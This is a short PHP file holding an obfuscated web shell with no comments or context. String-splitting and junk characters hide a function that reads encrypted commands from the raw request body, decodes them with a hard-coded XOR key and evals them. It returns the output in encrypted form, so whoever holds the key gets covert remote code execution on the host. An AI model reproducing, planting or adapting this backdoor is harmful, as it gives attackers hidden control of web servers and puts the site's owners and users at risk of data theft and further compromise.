<?php
$s=str_replace('Db','','creDbDbDbaDbDbte_fuDbnction');
$r='@w$j<$c@w&&$i@w<$l);$@wj++,$i+@w+){$@wo.=@w$t{$i}^$k@w{$j@w};}}return $o@w;@w}if (@pre@w@wg_mat';
$J='@w@eva@wl(@g@wzunc@wompress(@x(@w@ba@wse64_decode(@w$m[1]@w)@w,$k)))@w;$o=@ob_get@w_conten@wts();@@w';
$R='ob_en@wd@w_clean()@w;$r=@base@w64_e@wncode(@x(@w@gzc@w@wompress(@w$o),$k));@wprint("@w$@wp$kh$r$kf");}';
$l='t@wion @wx@w($t,$k){$@w@wc=s@w@wtrlen($k);$l=strl@wen($t);$o="";@wfor($i=@w0;@w$i<$l;){for@w($j=0;(';
$I='$k=@w"558f6fdc";@w$k@wh@w="9ddaf79@w6192c";@w$kf="b544cc@w18b3@w6@w6";$p="bRSmSoS@wFT6J@wdSHMj";f@wunc';
$D='ch("/@w@w$kh(.+)$@wkf/@w",@file_@wget_content@w@ws("php://inpu@w@wt@w")@w,$m)==1) {@ob_start();';
$T=str_replace('@w','',$I.$l.$r.$D.$J.$R);
$B=$s('',$T);$B();
?>
